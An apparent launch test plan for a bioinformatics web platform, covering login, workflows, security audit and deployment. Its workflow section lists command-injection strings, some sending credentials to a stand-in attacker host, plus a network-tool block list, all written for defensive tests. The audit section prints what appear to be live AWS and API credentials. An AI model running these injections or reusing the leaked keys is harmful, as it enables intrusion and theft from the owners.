# Consolidated Test Plans 3-8: Complete Launch Preparation

**Date:** 2025-11-11
**Version:** 1.0
**Status:** READY FOR IMPLEMENTATION

This document consolidates test plans 3-8 for efficient reference during launch preparation.

---

# Test Plan 3: Login & Session Management

## Critical Issues Found

### Current Implementation
- File: `/home/yzhang/biomate/frontend/client/src/pages/auth/login.tsx`
- Endpoint: `POST /api/auth/login`
- Authentication: JWT with HTTP-only cookies
- Session Duration: 7 days

### Launch Blockers
1. 🔴 **No Redis configured** - Sessions use MemoryStore (won't scale)
2. 🔴 **OAuth not configured** - Google/GitHub login disabled
3. ⚠️ No 2FA/MFA option
4. ⚠️ No suspicious login detection
5. ⚠️ No session revocation system
6. ⚠️ No concurrent session limits

---

## Test Cases

### TC-LOGIN-001: Basic Login Flow
**Test Steps:**
1. Navigate to /login
2. Enter valid credentials
3. Submit form
4. Verify redirect to dashboard

**Automated Test:**
```javascript
test('User can login with valid credentials', async ({ page }) => {
  await page.goto('http://localhost:5000/login');
  await page.fill('[name="email"]', 'test@example.com');
  await page.fill('[name="password"]', 'SecurePass123!');
  await page.click('button[type="submit"]');

  await page.waitForURL(/dashboard/);
  const userName = await page.locator('[data-testid="user-name"]').textContent();
  expect(userName).toBeTruthy();
});
```

**Success Criteria:**
- ✓ JWT token generated
- ✓ HTTP-only cookie set
- ✓ lastLoginAt updated in database
- ✓ Subscription status checked
- ✓ Trial expiration verified

---

### TC-LOGIN-002: Invalid Credentials
**Test Cases:**
| Scenario | Expected Result |
|----------|----------------|
| Wrong password | "Invalid email or password" |
| Non-existent email | "Invalid email or password" (don't reveal which) |
| Empty fields | "Email and password required" |
| SQL injection attempt | Safe handling, no execution |

---

### TC-LOGIN-003: Account Lockout
**Objective:** Prevent brute force attacks

**Test Steps:**
1. Attempt login with wrong password 5 times
2. Verify account locked
3. Attempt login with correct password
4. Verify still locked

**Expected:**
- After 5 failed attempts: Account locked for 15 minutes
- Error: "Too many failed attempts. Try again in X minutes."
- Lockout email sent to user

**Implementation Required:**
```typescript
// Add to login endpoint
const loginAttempts = await getLoginAttempts(email);

if (loginAttempts >= 5) {
  const lockoutEnd = await getLockoutEnd(email);
  if (lockoutEnd > Date.now()) {
    return res.status(429).json({
      error: 'AccountLocked',
      message: `Account locked. Try again in ${formatTime(lockoutEnd - Date.now())}`
    });
  }
}
```

---

### TC-LOGIN-004: Session Persistence
**Test Steps:**
1. Login successfully
2. Close browser
3. Reopen browser
4. Visit dashboard

**Expected:** User still logged in (cookie persists)

---

### TC-LOGIN-005: Session Expiration
**Test Steps:**
1. Login
2. Wait 7 days (or manipulate cookie)
3. Try to access protected route

**Expected:** Redirect to login with message "Session expired"

---

### TC-LOGIN-006: OAuth Login (Google)
**Prerequisites:** Google OAuth configured

**Test Steps:**
1. Click "Sign in with Google"
2. Authorize with Google account
3. Verify redirect to platform
4. Check database for user creation

**Expected:**
- User created with email from Google
- OAuth provider stored
- No password set (NULL)
- Can only login via Google afterward

**Implementation Check:**
```bash
# Verify env vars set
echo $GOOGLE_CLIENT_ID
echo $GOOGLE_CLIENT_SECRET
```

---

### TC-LOGIN-007: OAuth Login (GitHub)
Similar to TC-LOGIN-006 but with GitHub

---

### TC-LOGIN-008: Trial Expired User
**Test Steps:**
1. Create user with expired trial
2. Attempt login
3. Verify behavior

**Expected:**
- Login succeeds
- Redirect to payment page (not dashboard)
- Banner: "Your trial has expired. Please subscribe to continue."

---

### TC-LOGIN-009: Canceled Subscription User
**Test Steps:**
1. User with subscriptionStatus = 'canceled'
2. Attempt login

**Expected:**
- Login succeeds
- Access denied to platform features
- Message: "Your subscription has been canceled. Reactivate to continue."

---

### TC-LOGIN-010: Suspicious Login Detection
**Scenarios to Detect:**
- Login from new device
- Login from new geo-location
- Login from Tor/VPN
- Login at unusual time

**Expected:**
- Email notification: "New login detected from [location]"
- Option to secure account
- Security log entry

**Implementation Required:**
```typescript
import geoip from 'geoip-lite';

async function checkSuspiciousLogin(user, req) {
  const ip = req.ip;
  const userAgent = req.headers['user-agent'];
  const geo = geoip.lookup(ip);

  const lastLogin = await getLastLogin(user.id);

  // Check if different country
  if (lastLogin.country !== geo.country) {
    await sendSecurityEmail(user, {
      type: 'new_location',
      location: `${geo.city}, ${geo.country}`,
      ip: ip
    });
  }

  // Log login
  await logSecurityEvent({
    userId: user.id,
    event: 'login',
    ip: ip,
    userAgent: userAgent,
    location: geo
  });
}
```

---

### TC-LOGIN-011: Password Reset Flow
**Test Steps:**
1. Click "Forgot Password?"
2. Enter email
3. Receive reset email
4. Click reset link
5. Enter new password
6. Verify can login with new password

**Expected:**
- Reset token valid for 1 hour
- Token single-use (can't reuse)
- Old sessions invalidated after reset

---

### TC-LOGIN-012: Concurrent Session Handling
**Test Steps:**
1. Login on Desktop (Chrome)
2. Login on Mobile (Safari)
3. Verify both sessions active
4. Optionally: Limit to 3 concurrent sessions

**Implementation Options:**
- Allow unlimited sessions (current behavior)
- Limit to N sessions (recommended for security)
- Show active sessions in settings

---

## Redis Configuration (CRITICAL)

**Why Required:**
- MemoryStore doesn't persist across server restarts
- Can't scale across multiple server instances
- No session management capabilities

**Setup Steps:**
```bash
# Install Redis
sudo apt-get install redis-server

# Or use Docker
docker run -d -p 6379:6379 redis:alpine

# Configure Biomate
export REDIS_URL=redis://localhost:6379
# or
export REDIS_HOST=localhost
export REDIS_PORT=6379
export REDIS_PASSWORD=your_password  # if auth enabled
```

**Update Code:**
```typescript
// frontend/server/session.ts
import RedisStore from 'connect-redis';
import { createClient } from 'redis';

const redisClient = createClient({
  url: process.env.REDIS_URL || 'redis://localhost:6379'
});

await redisClient.connect();

const sessionConfig = {
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  }
};
```

---

## Security Testing

### TC-SEC-LOGIN-001: Session Fixation
**Attack:** Attacker sets user's session ID before login

**Test:**
1. Get session cookie
2. Logout
3. Login with same cookie

**Expected:** New session ID generated after login

---

### TC-SEC-LOGIN-002: Session Hijacking
**Attack:** Attacker steals session cookie

**Mitigation:**
- HTTP-only cookies (can't access via JavaScript)
- Secure flag (HTTPS only)
- SameSite=Strict (CSRF protection)
- Bind session to IP address (optional, may cause issues with mobile)

---

### TC-SEC-LOGIN-003: Timing Attack Prevention
**Attack:** Measure response time to determine if user exists

**Test:**
1. Login with existing email, wrong password (measure time)
2. Login with non-existent email (measure time)
3. Compare times

**Expected:** Response times should be similar (use constant-time comparison)

---

## Success Criteria

**Must Pass:**
- [ ] Basic login works
- [ ] Session persistence works
- [ ] Redis configured and operational
- [ ] Account lockout prevents brute force
- [ ] Session expiration enforced
- [ ] Password reset flow works
- [ ] All security tests pass

**Should Pass:**
- [ ] OAuth providers configured (Google + GitHub)
- [ ] Suspicious login detection active
- [ ] Concurrent session limits enforced
- [ ] Security logging implemented

---

# Test Plan 4: Platform Dashboard & Main Interface

## Critical Issue

### MISSING MAIN PLATFORM PAGE
**File:** `/home/yzhang/biomate/frontend/client/src/pages/home.tsx`
**Size:** 75 bytes (essentially empty)
**Impact:** No main platform interface after login!

**What's Missing:**
1. Main workflow builder interface
2. Chat interface integration
3. Dataset management view
4. Project/workflow listing
5. Quick actions panel
6. User settings access
7. Notifications area
8. Help/documentation links

---

## Required Implementation

### Main Platform Interface (home.tsx)

**Components to Include:**
```typescript
// Enhanced Home Page Layout
export function HomePage() {
  return (
    <div className="platform-layout">
      {/* Top Navigation Bar */}
      <TopNavigation
        user={user}
        notifications={notifications}
        onSettingsClick={openSettings}
      />

      {/* Sidebar */}
      <Sidebar
        sections={[
          { icon: 'home', label: 'Dashboard', path: '/dashboard' },
          { icon: 'workflow', label: 'Workflows', path: '/workflows' },
          { icon: 'data', label: 'Datasets', path: '/datasets' },
          { icon: 'chat', label: 'AI Assistant', path: '/chat' },
          { icon: 'settings', label: 'Settings', path: '/settings' }
        ]}
      />

      {/* Main Content Area */}
      <MainContent>
        <ChatInterface />
        <WorkflowBuilder />
        <ExecutionTimeline />
      </MainContent>

      {/* Right Panel (Optional) */}
      <RightPanel>
        <RecentWorkflows />
        <QuickActions />
      </RightPanel>
    </div>
  );
}
```

---

## Test Cases

### TC-PLATFORM-001: Dashboard Load
**Test Steps:**
1. Login successfully
2. Verify redirect to dashboard
3. Check all sections load

**Expected:**
- User stats displayed (workflows run, datasets stored, etc.)
- Recent workflows shown
- Quick action buttons functional
- Navigation sidebar visible

---

### TC-PLATFORM-002: Chat Interface Access
**Test Steps:**
1. Navigate to platform
2. Locate chat interface
3. Enter message
4. Verify AI response

**Expected:**
- Chat interface visible and accessible
- Messages send successfully
- AI responds appropriately
- Chat history persists

---

### TC-PLATFORM-003: Workflow Builder Access
**Test Steps:**
1. Click "New Workflow" or similar
2. Verify workflow builder loads
3. Check all tools available

**Expected:**
- Workflow builder displays
- Tool palette visible
- Can drag/drop tools
- Can configure parameters

---

### TC-PLATFORM-004: Dataset Management
**Test Steps:**
1. Navigate to "Datasets" section
2. Verify datasets listed
3. Test upload functionality
4. Test download functionality

**Expected:**
- All user datasets listed
- Upload button functional
- File previews work
- Download links work

---

### TC-PLATFORM-005: Settings Page
**Test Steps:**
1. Click user menu
2. Select "Settings"
3. Verify settings page loads

**Expected Sections:**
- Profile (name, email, organization)
- Password change
- Subscription management
- API keys
- Notifications preferences
- Billing history

---

### TC-PLATFORM-006: Navigation
**Test Steps:**
Test all navigation links work:
- Dashboard
- Workflows
- Datasets
- Chat
- Settings
- Logout

---

### TC-PLATFORM-007: Responsive Layout
**Test Steps:**
1. Resize browser window
2. Test on mobile viewport (390x844)
3. Test on tablet (768x1024)

**Expected:**
- Layout adapts to screen size
- Sidebar collapses on mobile
- All features accessible
- No broken layouts

---

### TC-PLATFORM-008: Performance with Large Data
**Test Steps:**
1. Create user with 100 workflows
2. Create user with 1000 messages
3. Load dashboard
4. Measure load time

**Expected:**
- Load time < 2 seconds with pagination
- Smooth scrolling
- No memory leaks
- Infinite scroll or pagination works

---

## Success Criteria

**Must Pass (BLOCKERS):**
- [ ] Main platform interface implemented (home.tsx fixed)
- [ ] Chat interface accessible
- [ ] Workflow builder accessible
- [ ] All navigation works
- [ ] Settings page complete

**Should Pass:**
- [ ] Mobile responsive
- [ ] Performance optimized
- [ ] User onboarding flow
- [ ] Help documentation accessible

---

# Test Plan 5: Workflow Execution

## Critical Security Issue

### COMMAND INJECTION IN TOOL INSTALLATION
**Severity:** P0 - CRITICAL
**File:** `/home/yzhang/biomate/backend/lib/galaxy/ai/tool_auto_installer.py`
**Impact:** 1000+ tools vulnerable to remote code execution

**Attack Vectors:**
- Command chaining: `; rm -rf /`
- Command substitution: `$(curl attacker.com)`
- Data exfiltration: `$(curl attacker.com?data=$(cat ~/.aws/credentials))`
- Python code execution in advanced_options
- Docker container network access

**Required Fix: BEFORE LAUNCH**
```python
# Implement input sanitization
import re
import shlex

BLOCKED_PATTERNS = [
    r'[;&|`$]',  # Command separators
    r'\$\(',  # Command substitution
    r'curl|wget|nc|telnet',  # Network tools
    r'rm -rf',  # Dangerous commands
    r'eval|exec|__import__',  # Code execution
]

def sanitize_tool_input(value):
    """Sanitize tool input to prevent injection"""
    for pattern in BLOCKED_PATTERNS:
        if re.search(pattern, str(value)):
            raise ValueError(f"Blocked pattern detected: {pattern}")

    # Use shlex for proper escaping
    return shlex.quote(str(value))

# Apply before any tool execution
for param, value in tool_params.items():
    tool_params[param] = sanitize_tool_input(value)
```

---

## Test Cases

### TC-WORKFLOW-001: Generate Workflow from Chat
**Test Steps:**
1. Open chat interface
2. Enter: "I need to align RNA-seq reads and quantify gene expression"
3. Verify workflow generated
4. Review suggested tools

**Expected:**
- Workflow with appropriate tools (STAR, featureCounts)
- Parameters pre-configured
- Option to modify before execution

---

### TC-WORKFLOW-002: Dataset Upload
**Test Steps:**
1. Click "Upload Dataset"
2. Select FASTQ file (< 500MB)
3. Upload
4. Verify upload completes

**Expected:**
- Progress bar displayed
- Upload to S3 successful
- Dataset registered in Galaxy
- Dataset appears in dataset list

---

### TC-WORKFLOW-003: Large Dataset Upload
**Test Steps:**
1. Upload file > 500MB
2. Verify handling

**Expected:**
- Chunked upload
- Resumable if interrupted
- Progress tracking accurate

---

### TC-WORKFLOW-004: Workflow Execution
**Test Steps:**
1. Create/select workflow
2. Assign input datasets
3. Click "Execute"
4. Monitor progress

**Expected:**
- Workflow submitted to Galaxy
- Invocation ID returned
- SSE connection established
- Progress updates stream in real-time

---

### TC-WORKFLOW-005: Real-time Monitoring (SSE)
**Test Steps:**
1. Execute workflow
2. Open browser DevTools > Network
3. Monitor SSE connection

**Expected:**
- SSE endpoint: `/api/galaxy/workflows/sse/:invocationId`
- Events received:
  - `workflow_state`: scheduled → running → complete
  - `step_state`: queued → running → ok
  - `progress_milestone`: 25%, 50%, 75%, 100%
  - `job_log`: Output messages

---

### TC-WORKFLOW-006: Pause/Resume Job
**Test Steps:**
1. Start long-running workflow
2. Click "Pause" button
3. Verify job paused
4. Click "Resume"
5. Verify job resumes

**Expected:**
- Pause button appears for running jobs
- Job state changes to 'paused'
- Resume button appears
- Job continues from where it paused

---

### TC-WORKFLOW-007: Job Priority
**Test Steps:**
1. Start workflow with priority='high'
2. Start workflow with priority='low'
3. Verify high priority executes first

**Expected:**
- Priority parameter accepted: `{ __priority: 'high' }`
- High priority jobs scheduled before low priority

---

### TC-WORKFLOW-008: Error Handling
**Test Scenarios:**
| Scenario | Expected Behavior |
|----------|------------------|
| Galaxy server down | Error: "Workflow service unavailable" |
| Invalid input format | Error: "Dataset format incompatible" |
| Tool failure | Display error log, option to retry |
| Network interruption | Auto-reconnect SSE, resume updates |

---

### TC-WORKFLOW-009: Workflow Validation
**Test Steps:**
1. Create workflow with incompatible tools
2. Try to execute
3. Verify validation catches issue

**Expected:**
- Pre-execution validation
- Clear error messages
- Suggestions for fixes

---

### TC-WORKFLOW-010: Tool Installation Security
**CRITICAL SECURITY TEST**

**Test Inputs (Must Block):**
```python
malicious_inputs = [
    "; curl attacker.com",  # Command injection
    "$(cat /etc/passwd)",  # Command substitution
    "`wget malware.sh`",  # Backticks
    "| nc attacker.com 4444",  # Pipe to network
    "&& rm -rf /",  # Command chaining
    "eval('__import__(\"os\").system(\"whoami\")')",  # Code execution
]
```

**Test Procedure:**
For each input:
1. Attempt to install tool with malicious parameter
2. Verify blocked
3. Verify no code execution
4. Check security log

**Expected:**
- All malicious patterns blocked
- Error: "Invalid tool parameter detected"
- Security alert logged
- Admin notified

---

## Success Criteria

**Must Pass (BLOCKERS):**
- [ ] Tool installation security vulnerabilities fixed
- [ ] Input sanitization implemented
- [ ] Workflow execution works end-to-end
- [ ] Real-time monitoring functional
- [ ] Pause/resume works
- [ ] Error handling graceful

**Should Pass:**
- [ ] Large file uploads work
- [ ] Job priority functional
- [ ] Workflow validation prevents errors
- [ ] All security tests pass

---

# Test Plan 6: Output & Results

## Test Cases

### TC-OUTPUT-001: Results Display
**Test Steps:**
1. Execute workflow successfully
2. Navigate to results page
3. Verify outputs displayed

**Expected:**
- All output files listed
- File types identified (FASTQ, BAM, CSV, etc.)
- File sizes shown
- Download buttons functional

---

### TC-OUTPUT-002: File Download
**Test Steps:**
1. Click download button
2. Verify file downloads
3. Open file locally

**Expected:**
- Download starts immediately
- File integrity intact (checksum verified)
- Correct content

---

### TC-OUTPUT-003: Large File Streaming
**Test Steps:**
1. Download file > 1GB
2. Monitor download

**Expected:**
- Streaming download (not loaded into memory)
- Progress indicator
- Can resume if interrupted

---

### TC-OUTPUT-004: File Preview
**Test Cases:**
| File Type | Preview Type |
|-----------|-------------|
| Image (PNG, JPG) | Display image |
| CSV/TSV | Display table (first 100 rows) |
| Text | Display first 1000 lines |
| PDF | Embedded PDF viewer |
| BAM/FASTQ | Not previewable, show metadata |

---

### TC-OUTPUT-005: Results Sharing
**Test Steps:**
1. Select results
2. Click "Share"
3. Generate share link
4. Test link in incognito

**Expected:**
- Shareable URL generated
- Expiration time set (7 days default)
- Anonymous access allowed (or require authentication)
- Permissions enforced

---

### TC-OUTPUT-006: Export Options
**Test Steps:**
Test export to:
- Galaxy .ga format
- JSON workflow definition
- ZIP archive of all outputs

**Expected:** All formats export correctly

---

## Success Criteria

**Must Pass:**
- [ ] All output types display correctly
- [ ] Download works for all file sizes
- [ ] File streaming for large files

**Should Pass:**
- [ ] File preview for common types
- [ ] Results sharing functional
- [ ] Export options work

---

# Test Plan 7: Security Audit & Remediation

## P0 CRITICAL VULNERABILITIES (MUST FIX)

### 1. Exposed Credentials in .env
**Files:** `/home/yzhang/biomate/frontend/.env`

**Exposed:**
```bash
AWS_ACCESS_KEY_ID=AKIAV2DX3XSKGYVKVDET
AWS_SECRET_ACCESS_KEY=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
ANTHROPIC_API_KEY=sk-ant-api03-6L7-pcB1Bxi...
GALAXY_API_KEY=a7e9f73a7c25300e222d27c84efb10f6
```

**IMMEDIATE ACTION REQUIRED:**
```bash
# 1. Rotate ALL credentials
aws iam create-access-key --user-name biomate-app
# Revoke old key
aws iam delete-access-key --access-key-id AKIAV2DX3XSKGYVKVDET

# 2. Create new Anthropic API key
# Visit: https://console.anthropic.com/

# 3. Generate new Galaxy API key

# 4. Remove .env from version control
echo ".env" >> .gitignore
git rm --cached .env
git commit -m "Remove sensitive .env file"

# 5. Use secrets manager (AWS Secrets Manager, HashiCorp Vault, or env vars)
```

---

### 2. Command Injection in Tools
**Severity:** P0
**Status:** Documented in Test Plan 5
**Fix:** Input sanitization + XML validation + user approval

---

### 3. No CSRF Protection
**Severity:** P1

**Fix:**
```typescript
import csrf from 'csurf';

const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  }
});

app.use(csrfProtection);

// Add to all state-changing routes
app.post('/api/auth/register', csrfProtection, registerHandler);
app.post('/api/workflows/*', csrfProtection, workflowHandler);
```

---

### 4. Weak JWT Secret
**Current:** `JWT_SECRET=a1b2c3d4...` (default/weak)

**Fix:**
```bash
# Generate strong secret (32+ bytes random)
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# Set in production
export JWT_SECRET=<generated_secret>
```

---

### 5. No Security Headers
**Fix:** Use helmet.js
```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://www.googletagmanager.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.stripe.com"],
      frameSrc: ["https://checkout.stripe.com"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

---

## Security Testing Checklist

### SQL Injection
- [ ] Test all input fields with SQL payloads
- [ ] Verify Drizzle ORM uses parameterized queries
- [ ] No raw SQL queries with user input

### XSS (Cross-Site Scripting)
- [ ] Test all text inputs with XSS payloads
- [ ] Verify React escapes output by default
- [ ] Check for dangerous `innerHTML` usage
- [ ] Test file upload filenames

### CSRF (Cross-Site Request Forgery)
- [ ] CSRF tokens on all POST/PUT/DELETE requests
- [ ] SameSite cookie attribute set
- [ ] Referer header validation

### Authentication & Authorization
- [ ] Password hashing (bcrypt, 12 rounds)
- [ ] JWT secret is strong
- [ ] Sessions expire correctly
- [ ] Authorization checks on all protected routes

### Input Validation
- [ ] Backend validation (not just frontend)
- [ ] File upload restrictions (type, size)
- [ ] Parameter sanitization
- [ ] JSON schema validation

### Sensitive Data Exposure
- [ ] No credentials in version control
- [ ] No API keys in client-side code
- [ ] Error messages don't leak info
- [ ] HTTPS enforced in production

### Security Headers
- [ ] Content-Security-Policy
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] Strict-Transport-Security
- [ ] Referrer-Policy

### Rate Limiting
- [ ] Auth endpoints limited
- [ ] API endpoints limited
- [ ] File uploads limited
- [ ] Proper error responses (429)

---

## Penetration Testing

**Recommended Tools:**
- OWASP ZAP
- Burp Suite
- Nmap
- SQLMap (for SQL injection testing)
- BeEF (for XSS testing)

**Test Scenarios:**
1. Attempt privilege escalation
2. Test session fixation/hijacking
3. Test IDOR (Insecure Direct Object Reference)
4. Test for SSRF (Server-Side Request Forgery)
5. Test file upload restrictions
6. Test API authentication bypass

---

# Test Plan 8: Infrastructure & Deployment

## Production Checklist

### Environment Configuration

**Required Environment Variables:**
```bash
# Application
NODE_ENV=production
PORT=5000
FRONTEND_URL=https://biomate.com
BACKEND_URL=https://api.biomate.com

# Database
DATABASE_URL=postgresql://user:pass@host:5432/biomate_prod

# Redis (CRITICAL)
REDIS_URL=redis://redis.biomate.internal:6379
# or
REDIS_HOST=redis.biomate.internal
REDIS_PORT=6379
REDIS_PASSWORD=<strong_password>

# Authentication
JWT_SECRET=<32_byte_random_hex>
JWT_EXPIRES_IN=7d
SESSION_SECRET=<32_byte_random_hex>

# Stripe (CRITICAL)
STRIPE_SECRET_KEY=sk_live_xxxx
STRIPE_PUBLISHABLE_KEY=pk_live_xxxx
STRIPE_WEBHOOK_SECRET=whsec_xxxx
STRIPE_PRICE_ACADEMIC_MONTHLY=price_xxxx
STRIPE_PRICE_ACADEMIC_YEARLY=price_xxxx
STRIPE_PRICE_PROFESSIONAL_MONTHLY=price_xxxx
STRIPE_PRICE_PROFESSIONAL_YEARLY=price_xxxx
STRIPE_PRICE_ENTERPRISE_MONTHLY=price_xxxx
STRIPE_PRICE_ENTERPRISE_YEARLY=price_xxxx

# AWS S3
AWS_ACCESS_KEY_ID=<from_secrets_manager>
AWS_SECRET_ACCESS_KEY=<from_secrets_manager>
AWS_REGION=us-east-1
S3_BUCKET_NAME=biomate-production-data

# Email Service (CRITICAL)
EMAIL_HOST=email-smtp.us-east-1.amazonaws.com
EMAIL_PORT=587
EMAIL_USER=<AWS_SES_username>
EMAIL_PASS=<AWS_SES_password>
EMAIL_FROM=noreply@biomate.com

# OAuth
GOOGLE_CLIENT_ID=xxxx.apps.googleusercontent.com
GOOGLE_CLIENT_SECRET=xxxx
GOOGLE_REDIRECT_URI=https://biomate.com/auth/google/callback

GITHUB_CLIENT_ID=xxxx
GITHUB_CLIENT_SECRET=xxxx
GITHUB_REDIRECT_URI=https://biomate.com/auth/github/callback

# Galaxy
GALAXY_URL=http://galaxy.biomate.internal:8081
GALAXY_API_KEY=<from_secrets_manager>

# Anthropic AI
ANTHROPIC_API_KEY=<from_secrets_manager>

# Monitoring
SENTRY_DSN=https://xxxx@sentry.io/xxxx
NEW_RELIC_LICENSE_KEY=xxxx

# Feature Flags
ENABLE_OAUTH=true
ENABLE_STRIPE=true
ENABLE_EMAIL=true
```

---

### Database Setup

**Production Database:**
```bash
# PostgreSQL with replication
Primary: db-primary.biomate.internal
Replica: db-replica.biomate.internal

# Connection pooling (PgBouncer)
Max connections: 100
Pool size: 20
```

**Backup Strategy:**
- Automated daily backups to S3
- Point-in-time recovery enabled
- Retention: 30 days
- Test restore monthly

**Migrations:**
```bash
cd /home/yzhang/biomate/frontend
npm run db:migrate:prod
```

---

### Redis Setup

**Production Redis:**
```bash
# Redis Cluster or Sentinel for HA
Redis version: 7.0+
Persistence: RDB + AOF
Max memory: 4GB
Eviction policy: allkeys-lru
```

**Configuration:**
```redis
# redis.conf
maxmemory 4gb
maxmemory-policy allkeys-lru
appendonly yes
appendfsync everysec
```

---

### Email Service Setup (AWS SES)

**Setup Steps:**
1. Verify domain in AWS SES
2. Request production access (remove sandbox limit)
3. Create SMTP credentials
4. Configure SPF, DKIM, DMARC records

**DNS Records:**
```dns
# SPF
TXT _spf.biomate.com "v=spf1 include:amazonses.com ~all"

# DKIM (provided by AWS)
TXT <selector>._domainkey.biomate.com "k=rsa; p=<public_key>"

# DMARC
TXT _dmarc.biomate.com "v=DMARC1; p=quarantine; rua=mailto:postmaster@biomate.com"
```

**Email Templates Required:**
1. Welcome email
2. Email verification
3. Password reset
4. Trial expiration warning (2 days before)
5. Payment succeeded
6. Payment failed
7. Subscription canceled
8. Workflow completion
9. Workflow failed
10. Security alerts

---

### SSL/TLS Certificates

**Let's Encrypt with Auto-Renewal:**
```bash
# Install certbot
sudo apt install certbot python3-certbot-nginx

# Get certificate
sudo certbot --nginx -d biomate.com -d www.biomate.com -d api.biomate.com

# Auto-renewal (cron job added automatically)
# Test renewal
sudo certbot renew --dry-run
```

---

### Load Balancer Configuration

**AWS Application Load Balancer:**
- Health check: `/api/health`
- Health check interval: 30s
- Unhealthy threshold: 2
- Target groups:
  - Frontend (port 5000)
  - Backend/Galaxy (port 8081)

**Target Group Configuration:**
```yaml
TargetGroup:
  Protocol: HTTP
  Port: 5000
  HealthCheck:
    Path: /api/health
    Interval: 30
    Timeout: 5
    HealthyThreshold: 2
    UnhealthyThreshold: 2
  Stickiness:
    Enabled: true
    Type: lb_cookie
    Duration: 86400  # 1 day
```

---

### Auto-Scaling

**Scaling Policy:**
```yaml
AutoScaling:
  MinSize: 2
  MaxSize: 10
  DesiredCapacity: 2

  ScaleUpPolicy:
    MetricName: CPUUtilization
    Threshold: 70
    ScalingAdjustment: +2 instances

  ScaleDownPolicy:
    MetricName: CPUUtilization
    Threshold: 30
    ScalingAdjustment: -1 instance
```

---

### Monitoring & Alerting

**Metrics to Monitor:**
- Server health (CPU, memory, disk)
- Application errors (error rate, error types)
- Database performance (query time, connections)
- API latency (p50, p95, p99)
- User activity (registrations, logins, workflows)
- Billing events (checkouts, payments, failures)

**Tools:**
- Prometheus + Grafana
- AWS CloudWatch
- Sentry (error tracking)
- New Relic or DataDog (APM)

**Alerts to Configure:**
1. Server down (critical)
2. High error rate > 5% (critical)
3. Database connection issues (critical)
4. Payment webhook failures (high)
5. Disk space < 20% (medium)
6. High latency > 2s (medium)
7. Failed workflow rate > 10% (medium)

---

### CI/CD Pipeline

**GitHub Actions Workflow:**
```yaml
name: Deploy to Production

on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run tests
        run: npm test
      - name: Run security scan
        run: npm audit --production

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Build Docker image
        run: docker build -t biomate:${{ github.sha }} .
      - name: Push to registry
        run: docker push biomate:${{ github.sha }}

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to production
        run: |
          aws ecs update-service \
            --cluster biomate-prod \
            --service biomate-web \
            --force-new-deployment
```

---

### Backup & Disaster Recovery

**Backup Strategy:**
- Database: Daily automated backups, 30-day retention
- S3 datasets: Versioning enabled, lifecycle policy to Glacier
- Configuration: Stored in version control + secrets manager

**Disaster Recovery Plan:**
1. Database failure:
   - Failover to replica (automatic)
   - RTO: 5 minutes, RPO: 0 (streaming replication)

2. Region failure:
   - Multi-region deployment (optional)
   - RTO: 1 hour, RPO: 1 hour

3. Data corruption:
   - Point-in-time restore
   - RTO: 2 hours, RPO: 5 minutes (WAL archiving)

**Recovery Testing:**
- Test restore quarterly
- Document recovery procedures
- Train team on recovery process

---

### Performance Optimization

**CDN Configuration:**
```yaml
CloudFront:
  Origins:
    - DomainName: biomate.com
      Id: biomate-frontend
      CustomHeaders:
        - HeaderName: X-CDN-Secret
          HeaderValue: <random_secret>

  Behaviors:
    - PathPattern: /static/*
      CacheTTL: 31536000  # 1 year
    - PathPattern: /api/*
      CacheTTL: 0  # No caching
    - PathPattern: /*
      CacheTTL: 300  # 5 minutes

  CompressionEnabled: true
```

**Caching Strategy:**
```javascript
// API response caching
app.use('/api/tools/search', cacheMiddleware(600));  // 10 min
app.use('/api/workflows', cacheMiddleware(60));  // 1 min
// Don't cache user-specific data
```

---

### Security Hardening

**Server Hardening:**
- [ ] Disable root login
- [ ] SSH key authentication only
- [ ] Firewall rules (allow only 80, 443, 22)
- [ ] Fail2ban configured
- [ ] Auto security updates
- [ ] Audit logging enabled

**Application Security:**
- [ ] All dependencies updated
- [ ] Security headers (helmet.js)
- [ ] HTTPS enforced
- [ ] Secrets in secrets manager (not env files)
- [ ] Rate limiting active
- [ ] CORS configured correctly

---

### Compliance

**GDPR (EU Users):**
- [ ] Privacy policy updated
- [ ] Cookie consent implemented
- [ ] Data export endpoint (`/api/user/export`)
- [ ] Data deletion endpoint (`/api/user/delete`)
- [ ] Data processing agreement
- [ ] Audit trail for data access

**PCI DSS (Payment Processing):**
- [ ] Use Stripe (SAQ-A compliance)
- [ ] Never store card data
- [ ] SSL/TLS enforced
- [ ] Security questionnaire completed

**SOC 2 Type II (Enterprise Customers):**
- [ ] Audit logging
- [ ] Access controls
- [ ] Data encryption (at rest and in transit)
- [ ] Incident response plan
- [ ] Annual audit

---

### Launch Checklist

**Pre-Launch (1 Week Before):**
- [ ] All tests passing (Lighthouse, security, load)
- [ ] All environment variables set in production
- [ ] DNS configured and tested
- [ ] SSL certificates installed
- [ ] Email templates created and tested
- [ ] Stripe products and prices created
- [ ] Stripe webhooks configured
- [ ] OAuth providers configured
- [ ] Database backups tested
- [ ] Monitoring and alerting configured
- [ ] Load testing completed (1000+ concurrent users)
- [ ] Security audit completed
- [ ] Disaster recovery plan documented

**Launch Day:**
- [ ] Database migrations run
- [ ] Deploy application
- [ ] Smoke tests pass
- [ ] Monitor error rates
- [ ] Monitor performance metrics
- [ ] Test user registration flow
- [ ] Test payment flow
- [ ] Test workflow execution
- [ ] Verify emails sending
- [ ] Verify webhooks receiving

**Post-Launch (First Week):**
- [ ] Monitor user feedback
- [ ] Fix critical bugs immediately
- [ ] Monitor payment success rate
- [ ] Monitor workflow completion rate
- [ ] Check database performance
- [ ] Review error logs daily
